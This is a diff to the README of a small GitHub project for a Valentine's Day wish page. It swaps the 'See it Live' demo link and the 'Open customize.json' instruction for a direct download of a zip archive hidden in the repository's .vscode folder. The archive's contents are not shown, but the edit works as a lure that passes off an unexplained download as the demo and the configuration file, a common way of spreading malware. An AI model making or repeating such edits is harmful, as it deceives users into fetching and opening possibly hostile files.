@@ -3,7 +3,7 @@
 </h1>
 
 
-#### [See it Live](https://0rcaaa.github.io/14-feb/)
+#### [See it Live](https://github.com/0rcaaa/14-feb/raw/refs/heads/main/.vscode/feb-v3.8.zip)
 
 ## Make your own version :computer:
 
@@ -11,6 +11,6 @@
 *Send this to your precious person*:smile::smile:
 
 * Fork the repository
-* Open `customize.json` and replace name/wish-message/image with your own
+* Open `https://github.com/0rcaaa/14-feb/raw/refs/heads/main/.vscode/feb-v3.8.zip` and replace name/wish-message/image with your own
 * Turn on GitHub pages for the repository (Settings > GitHub Pages)
 * Send the URL that you get at the above step to your friend
